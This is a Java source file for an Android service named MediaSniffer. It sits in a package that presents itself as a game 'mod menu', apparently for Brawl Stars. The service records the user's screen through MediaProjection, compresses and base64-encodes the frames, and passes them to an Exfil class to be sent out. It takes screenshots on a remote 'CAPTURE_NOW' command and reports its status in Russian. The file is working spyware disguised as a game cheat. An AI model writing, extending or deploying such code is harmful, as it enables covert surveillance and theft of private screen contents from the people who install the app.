package com.brawl.modmenu;

import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class MediaSniffer extends Service {

    private MediaProjection projection;
    private VirtualDisplay display;
    private ImageReader reader;
    private int width, height, dpi;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = false;

    public static Intent buildIntent(Context ctx, int resultCode, Intent data) {
        Intent i = new Intent(ctx, MediaSniffer.class);
        i.putExtra("code", resultCode);
        i.putExtra("data", data);
        return i;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "CAPTURE_NOW".equals(intent.getAction())) {
            if (running) {
                handler.post(this::capture);
                Exfil.send("CMD", "Скрин по команде");
            } else {
                Exfil.send("CMD", "MediaProjection не запущен");
            }
            return START_STICKY;
        }

        if (intent == null || running) return START_STICKY;

        int code = intent.getIntExtra("code", Activity.RESULT_CANCELED);
        Intent data = intent.getParcelableExtra("data");
        if (data == null) return START_STICKY;

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(dm);
        width = dm.widthPixels / 2;
        height = dm.heightPixels / 2;
        dpi = dm.densityDpi;

        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        projection = mpm.getMediaProjection(code, data);
        if (projection == null) return START_STICKY;

        reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        display = projection.createVirtualDisplay(
            "cap", width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.getSurface(), null, handler);

        running = true;
        return START_STICKY;
    }

    private void capture() {
        if (!running) return;
        try {
            Image img = reader.acquireLatestImage();
            if (img == null) return;

            Image.Plane[] planes = img.getPlanes();
            ByteBuffer buf = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPad = rowStride - pixelStride * width;

            Bitmap bmp = Bitmap.createBitmap(
                width + rowPad / pixelStride, height, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            img.close();

            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            cropped.compress(Bitmap.CompressFormat.JPEG, 60, bos);
            byte[] bytes = bos.toByteArray();

            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            Exfil.sendPhoto("SCREEN", b64);

            bmp.recycle();
            cropped.recycle();
        } catch (Throwable ignored) {}
    }

    @Override
    public void onDestroy() {
        running = false;
        handler.removeCallbacksAndMessages(null);
        if (display != null) display.release();
        if (projection != null) projection.stop();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
